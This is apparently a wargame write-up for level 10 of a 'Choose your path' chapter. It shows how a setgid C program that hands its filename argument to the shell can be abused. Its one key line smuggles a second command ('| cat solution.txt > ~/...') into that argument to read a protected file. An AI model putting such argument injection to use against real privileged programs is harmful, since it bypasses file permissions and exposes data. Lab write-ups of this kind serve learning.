# Level 10
---
This level 10 is a level of the chapiter named "Choose you Path". And the subject shows us everything about that level can be found in  ```/home/level``` under a directory named ```10_choose_your_path``` :
```sh
yourUsername@warchall:/home/level$ ls -al
    ...
drwxr-xr-x  3 level10 level10 4096 Jan 25 16:55 10_choose_your_path
    ... 
```
In that ```10_choose_your_path``` we can find a code named ```charp.c``` written in C language and the compiled file (the executable file) is the ```charp```.
We can see that there is a file named ```solution.txt```in this directory :
```sh
yourUsername@warchall:/home/level$ cd 10_choose_your_path/
yourUsername@warchall:/home/level/10_choose_your_path$ ls -al
    ...
-rwxr-sr-x  1 level10 level10 16392 Jan  3  2023 charp
-rw-r--r--  1 root    level10  1303 Jan  3  2023 charp.c
-rwxr--r--  1 root    level10    82 Jan  3  2023 compile.sh
-rw-rw----  1 root    level10   171 Jan  3  2023 solution.txt
    ...
```

After reading this C code, we can understand that the charp.c program is designed to analyze a specified file by accepting the filename as a command-line argument. Upon execution, the program employs the wc -l and wc -c commands to determine the respective line and character counts within the specified file. Subsequently, it computes the average number of characters per line by dividing the total character count by the total line count. The calculated result is then presented through standard output.

So, there is a thing here. If the program can count line and character in a file, we can redirect the content of the file it reads in a new file. 

After searching how can I break it down  with some documentation on pdf I got an idea : redirection.

So, our propose is to execute the file ```solution.txt``` and redirect the content of that file in a new file.

To do this, we're going to put ```solution.txt``` as an argument of ```./charp``` then use a pipe ```|``` and execute the command ```cat solution.txt``` and redirect that content of ```solution.txt``` in a new file (you can call it whatever you want to , but here in this write-up,  we are going to name it ```level10_solution.txt``` in our ```~```) :
```sh
yourUsername@warchall:/home/level/10_choose_your_path$ ./charp "solution.txt | cat solution.txt > ~/level10_solution.txt"
```
Then check in your ```~/level10_solution.txt``` using ```cat```command.

There you go ! A little bit challenging but did it!
